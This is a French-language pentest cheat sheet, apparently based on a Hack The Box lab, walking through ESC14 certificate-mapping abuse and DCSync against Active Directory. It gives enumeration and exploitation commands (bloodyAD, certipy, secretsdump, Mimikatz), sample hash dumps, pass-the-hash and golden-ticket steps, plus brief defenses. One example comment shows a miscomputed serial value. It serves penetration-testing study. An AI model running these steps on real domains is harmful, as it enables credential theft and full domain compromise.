# ESC14

***

### <mark style="color:red;">ESC14 Attack - Weak Certificate Mapping</mark>

#### 📖 Concept

ESC14 exploite la capacité d'écrire l'attribut `altSecurityIdentities` d'un utilisateur. Cet attribut définit des identités alternatives pour l'authentification par certificat.

#### 🔍 Types de mapping

```
X509:<I>IssuerName<S>SubjectName     # Fort (SAN)
X509:<I>IssuerName<SR>SerialNumber   # Fort (Issuer+Serial)
X509:<RFC822>email@domain.com        # FAIBLE (email uniquement)
X509:<SKI>SubjectKeyIdentifier       # Fort
```

#### 🎯 Prérequis

* Permission `WriteProperty` sur `altSecurityIdentities` d'un utilisateur cible
* Capacité d'enrollment sur un template de certificat
* Contrôle sur un utilisateur pouvant modifier son propre email

#### 🔍 Enumération

**Trouver les DACLs vulnérables**

```bash
# Avec PowerView (sur la cible)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -eq "Alt-Security-Identities"
}

# Avec BloodyAD
bloodyAD --host dc01.scepter.htb -d scepter.htb -u user -p pass \
    get writable --detail

# Avec Impacket
impacket-dacledit -action 'read' -principal 'cms' \
    -target 'p.adams' -dc-ip <DC_IP> -k -no-pass 'scepter.htb/h.brown'
```

**Vérifier les altSecurityIdentities existants**

```bash
# LDAP Search
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.com" -w password \
    -b "DC=scepter,DC=htb" "(altSecurityIdentities=*)" \
    altSecurityIdentities sAMAccountName

# BloodyAD
bloodyAD --host dc01.scepter.htb -d scepter.htb -u user -p pass \
    get object p.adams --attr altSecurityIdentities
```

#### 💣 Exploitation - Méthode 1 : RFC822 (Email)

**Étape 1 : Définir altSecurityIdentities sur la cible**

```bash
# Définir un email fictif ou existant
bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -p pass \
    set object p.adams altSecurityIdentities \
    -v 'X509:<RFC822>custom@scepter.htb'
```

**Étape 2 : Modifier l'email d'un utilisateur contrôlé**

```bash
# Utiliser GenericAll sur d.baker
bloodyAD -d scepter.htb -u a.carter -p 'Welcome1' \
    set object d.baker mail -v custom@scepter.htb
```

**Étape 3 : Demander un certificat**

```bash
certipy req -username d.baker@scepter.htb -hashes :HASH \
    -target dc01.scepter.htb -ca 'scepter-DC01-CA' \
    -template 'StaffAccessCertificate'
```

**Étape 4 : S'authentifier comme la cible**

```bash
certipy auth -pfx d.baker.pfx -username p.adams \
    -domain scepter.htb -dc-ip <DC_IP>
```

#### 💣 Exploitation - Méthode 2 : Issuer+Serial

**Étape 1 : Obtenir les détails du certificat**

```bash
# Extraire le certificat du PFX
openssl pkcs12 -in d.baker.pfx -clcerts -nokeys -passin pass: -out cert.pem

# Obtenir le serial number
openssl x509 -in cert.pem -noout -serial
# serial=62000000144951BBFA726A5C86000000000014

# Obtenir l'issuer
openssl x509 -in cert.pem -noout -issuer
# issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
```

**Étape 2 : Convertir le serial en format correct**

```python
# Script Python pour inverser le serial
def convert_serial(serial):
    serial = serial.replace(':', '').lower()
    serial_bytes = bytearray.fromhex(serial)
    serial_bytes.reverse()
    return "".join(['%02x' % b for b in serial_bytes])

# Exemple
serial = "62000000144951BBFA726A5C86000000000014"
reversed_serial = convert_serial(serial)
# 140000000000865C6A72FABB514914000000062
```

**Étape 3 : Format du mapping string**

```bash
# Format: X509:<I>IssuerDN<SR>ReversedSerial
MAPPING="X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>140000000000865c6a72fabb51491400000062"
```

**Étape 4 : Ajouter le mapping via PowerShell (sur la cible)**

```powershell
# Upload des scripts nécessaires
upload /path/to/Get-X509IssuerSerialNumberFormat.ps1
upload /path/to/Add-AltSecIDMapping.ps1
upload /path/to/Get-AltSecIDMapping.ps1

# Charger les scripts
ls *.ps1 | % { . $_.FullName }

# Générer le format correct
Get-X509IssuerSerialNumberFormat `
    -SerialNumber "62000000144951BBFA726A5C86000000000014" `
    -IssuerDistinguishedName "CN=scepter-DC01-CA,DC=scepter,DC=htb"

# Ajouter le mapping
Add-AltSecIDMapping `
    -DistinguishedName 'CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB' `
    -MappingString 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>140000000000865c6a72fabb51491400000062'

# Vérifier
Get-AltSecIDMapping 'CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB'
```

**Étape 5 : Authentification**

```bash
certipy auth -pfx d.baker.pfx -username p.adams \
    -domain scepter.htb -dc-ip <DC_IP>
```

#### 🎯 Différences entre les méthodes

| Méthode       | Complexité | Prérequis                            | Fiabilité  |
| ------------- | ---------- | ------------------------------------ | ---------- |
| RFC822        | Faible     | Contrôle email + WriteProperty       | Haute      |
| Issuer+Serial | Moyenne    | PowerShell sur cible + WriteProperty | Très haute |

#### 🛡️ Défense

* Activer Strong Certificate Mapping
* Auditer les permissions sur `altSecurityIdentities`
* Utiliser CertificateMappingMethods=0x1F (tous les types forts)

***

### 6. DCSync Attack

#### 📖 Concept

DCSync abuse le protocole de réplication DRSUAPI pour extraire les secrets du domaine (hashes NTLM, Kerberos keys) sans toucher au disque NTDS.dit.

#### 🎯 Prérequis (un de ces groupes)

* Domain Admins
* Enterprise Admins
* **Replication Operators** ⚠️ (cas de Scepter)
* Tout utilisateur avec `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`

#### 🔍 Enumération

**Vérifier les permissions DCSync**

```bash
# Avec BloodyAD
bloodyAD --host dc01.scepter.htb -d scepter.htb -u user -p pass \
    get object "DC=scepter,DC=htb" --attr nTSecurityDescriptor

# Avec PowerView
Get-DomainObjectAcl -SearchBase "DC=scepter,DC=htb" | 
    Where-Object {$_.ObjectAceType -match "Replication"}
```

**BloodHound query**

```cypher
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i).*replication.*"
RETURN p
```

#### 💣 Exploitation

**Méthode 1 : secretsdump.py (Impacket)**

```bash
# Avec NTLM hash
secretsdump.py scepter.htb/p.adams@dc01.scepter.htb \
    -hashes :1b925c524f447bb821a8789c4b118ce0 -no-pass

# Avec mot de passe
secretsdump.py scepter.htb/p.adams:Password123@dc01.scepter.htb

# Avec Kerberos
export KRB5CCNAME=p.adams.ccache
secretsdump.py -k -no-pass scepter.htb/p.adams@dc01.scepter.htb

# Dump uniquement les hashes (sans les fichiers)
secretsdump.py scepter.htb/p.adams@dc01.scepter.htb \
    -hashes :HASH -just-dc
```

**Méthode 2 : NetExec**

```bash
# DCSync basique
netexec smb dc01.scepter.htb -u p.adams -p Password123 \
    -M ntdsutil

# Avec hash
netexec smb dc01.scepter.htb -u p.adams -H HASH --ntds

# Extraire uniquement le hash Administrator
netexec smb dc01.scepter.htb -u p.adams -H HASH --ntds \
    --user Administrator
```

**Méthode 3 : Mimikatz (si shell)**

```powershell
# Sur la cible Windows
lsadump::dcsync /domain:scepter.htb /user:Administrator
```

#### 📊 Sortie attendue

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
[...]
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
```

#### 🔑 Utilisation des hashes

**Pass-The-Hash**

```bash
evil-winrm -i dc01.scepter.htb -u administrator \
    -H a291ead3493f9773dc615e66c2ea21c4
```

**Golden Ticket (avec krbtgt)**

```bash
impacket-ticketer -nthash c030fca580038cc8b1100ee37064a4a9 \
    -domain-sid S-1-5-21-74879546-916818434-740295365 \
    -domain scepter.htb administrator
```

#### ⚠️ Erreurs courantes

**RemoteOperations failed: DCERPC Runtime Error**

```
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
```

**Cause** : Erreur de connexion initiale, mais DCSync fonctionne quand même\
**Solution** : Ignorer l'erreur, les hashes sont extraits

**Access Denied**

```
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

**Cause** : Pas de permissions DCSync\
**Solution** : Vérifier le groupe/permissions de l'utilisateur

#### 🛡️ Défense

* Auditer les membres de Replication Operators
* Monitorer les événements 4662 (réplication DRSUAPI)
* Limiter les permissions DS-Replication-Get-Changes

***
